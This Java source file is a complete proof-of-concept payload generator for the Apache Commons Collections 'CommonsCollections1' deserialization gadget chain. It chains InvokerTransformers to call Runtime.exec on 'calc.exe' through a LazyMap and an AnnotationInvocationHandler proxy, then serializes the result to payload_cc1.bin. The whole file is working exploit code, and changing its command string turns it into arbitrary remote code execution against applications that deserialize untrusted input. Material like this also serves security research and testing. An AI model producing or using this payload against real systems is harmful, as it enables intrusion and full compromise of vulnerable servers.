package com.example;  
  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.LazyMap;  
  
import java.io.*;  
import java.lang.reflect.Constructor;  
import java.lang.reflect.InvocationHandler;  
import java.lang.reflect.InvocationTargetException;  
import java.lang.reflect.Proxy;  
import java.util.HashMap;  
import java.util.Map;  
  
public class CommonsCollections1 {  
    public static void main(String... args) throws ClassNotFoundException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException {  
        // Command  
        String[] execArgs = {"calc.exe"};  
  
        // Create a ChainTransformer to invoke that command.  
        final Transformer[] transformers = new Transformer[] {  
                new ConstantTransformer(Runtime.class),  
                new InvokerTransformer("getMethod", new Class[] {  
                        String.class, Class[].class }, new Object[] {  
                        "getRuntime", new Class[0] }),  
                new InvokerTransformer("invoke", new Class[] {  
                        Object.class, Object[].class }, new Object[] {  
                        null, new Object[0] }),  
                new InvokerTransformer("exec",  
                        new Class[] { String.class }, execArgs),  
                new ConstantTransformer(1) };  
  
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
  
        // Create a LazyMap  
        Map map = new HashMap<>();  
        Map lazyMap = LazyMap.decorate(map, chainedTransformer);  
  
        // Init a `sun.reflect.annotation.AnnotationInvocationHandler` object  
        Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  
        final Constructor<?> constructor = cls.getDeclaredConstructors()[0];  
        constructor.setAccessible(true);  
        InvocationHandler lazyMapInvocationHandler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);  
        Map evilProxy = (Map) Proxy.newProxyInstance(CommonsCollections1.class.getClassLoader(), new Class[]{Map.class}, lazyMapInvocationHandler);  
  
        InvocationHandler serializedProxyInvocationHandler = (InvocationHandler) constructor.newInstance(Override.class, evilProxy);  
  
        serialize(serializedProxyInvocationHandler);  
    }  
  
    public static void serialize(Object object) throws IOException {  
        FileOutputStream fileOut = new FileOutputStream("payload_cc1.bin");  
        ObjectOutputStream out = new ObjectOutputStream(fileOut);  
        out.writeObject(object);  
        out.close();  
        fileOut.close();  
    }  
}